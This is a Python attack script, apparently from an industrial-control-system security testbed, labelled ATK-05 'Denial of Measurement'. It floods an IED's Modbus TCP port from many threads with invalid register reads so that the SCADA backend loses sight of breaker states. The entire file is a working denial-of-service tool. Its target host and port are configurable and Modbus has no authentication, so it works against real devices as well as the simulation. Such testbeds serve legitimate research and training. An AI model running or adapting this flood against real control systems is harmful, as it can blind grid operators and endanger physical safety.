#!/usr/bin/env python3
"""
ATK-05 | Denial of Measurement (DoS)
======================================
Floods the IED's Modbus TCP port with rapid, malformed / garbage holding-
register read requests.  The IED's Modbus server (OpenPLC) is single-threaded
and queues requests sequentially.  While the queue is jammed:

  • The TRINETRA backend's polling calls time out → it can't read breaker state.
  • The physics engine writes to IED registers → but reads fail → SCADA receives
    stale / no data for all breakers, effectively blinding the control room.

This is a *volumetric* application-layer DoS — not a network flood — targeting
the Modbus protocol's lack of authentication.

Effect on the simulation
------------------------
  ModbusManager.poll_all_breakers() raises exceptions or returns empty results.
  The dashboard SSE stream shows all breakers as "unknown" / offline.

Usage
-----
    python atk05_denial_of_measurement.py
    python atk05_denial_of_measurement.py --target 127.0.0.1 --port 5020 --duration 20 --threads 10
"""
import argparse
import threading
import time
from pymodbus.client import ModbusTcpClient


# ── per-thread flood worker ────────────────────────────────────────────────────

def flood_worker(target: str, port: int, stop_event: threading.Event,
                 counters: dict, thread_id: int):
    """Continuously hammers garbage Modbus read requests until stop_event is set."""
    client = ModbusTcpClient(target, port=port, timeout=1)
    client.connect()   # best-effort; connection may fail under load

    req_count = 0
    err_count = 0

    while not stop_event.is_set():
        try:
            # Read registers at address 2000 onwards — these don't exist in PLC 
            # memory, so every call is a valid-protocol-but-invalid-address request
            # that the PLC must parse and respond with an exception code.
            result = client.read_holding_registers(2000, count=10)
            if result.isError():
                err_count += 1
            req_count += 1
        except Exception:
            err_count += 1
            # Reconnect on errors to keep flooding
            try:
                client.close()
                client = ModbusTcpClient(target, port=port, timeout=1)
                client.connect()
            except Exception:
                pass

    client.close()

    # Accumulate into shared counters (GIL makes += safe for int here)
    counters["requests"] += req_count
    counters["errors"]   += err_count


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="ATK-05: DoS flood targeting the IED Modbus port to blind SCADA."
    )
    parser.add_argument("--target",   type=str, default="127.0.0.1",
                        help="Target IED IP address")
    parser.add_argument("--port",     type=int, default=5020,
                        help="Target IED Modbus TCP port  (default 5020 = IED-1)")
    parser.add_argument("--duration", type=float, default=15.0,
                        help="Attack duration in seconds  (default 15)")
    parser.add_argument("--threads",  type=int,   default=8,
                        help="Number of concurrent flood threads  (default 8)")
    args = parser.parse_args()

    print("=" * 60)
    print("  ATK-05  |  Denial of Measurement (DoS)")
    print("=" * 60)
    print(f"[*] Target IED    : {args.target}:{args.port}")
    print(f"[*] Flood threads : {args.threads}")
    print(f"[*] Duration      : {args.duration} s")
    print()
    print("[*] Launching flood threads …")

    stop_event = threading.Event()
    counters   = {"requests": 0, "errors": 0}
    threads    = []

    for i in range(args.threads):
        t = threading.Thread(
            target=flood_worker,
            args=(args.target, args.port, stop_event, counters, i),
            daemon=True
        )
        t.start()
        threads.append(t)

    # Live status ticker
    start = time.time()
    try:
        while time.time() - start < args.duration:
            elapsed = time.time() - start
            print(f"\r[~] Flooding … {elapsed:5.1f}s / {args.duration}s  "
                  f"| Requests: {counters['requests']:6d}  "
                  f"| Errors: {counters['errors']:6d}",
                  end="", flush=True)
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")

    # Signal all threads to stop
    stop_event.set()
    for t in threads:
        t.join(timeout=3.0)

    total = counters["requests"]
    errs  = counters["errors"]
    rate  = total / max(time.time() - start, 1)

    print(f"\n\n[+] ATTACK COMPLETE")
    print(f"    Total requests sent : {total}")
    print(f"    Errors / timeouts   : {errs}")
    print(f"    Average rate        : {rate:.1f} req/s")
    print("[+] During the flood, SCADA was blind to breaker states.")
    print("[+] Check the TRINETRA backend logs for poll timeout warnings.")


if __name__ == "__main__":
    main()
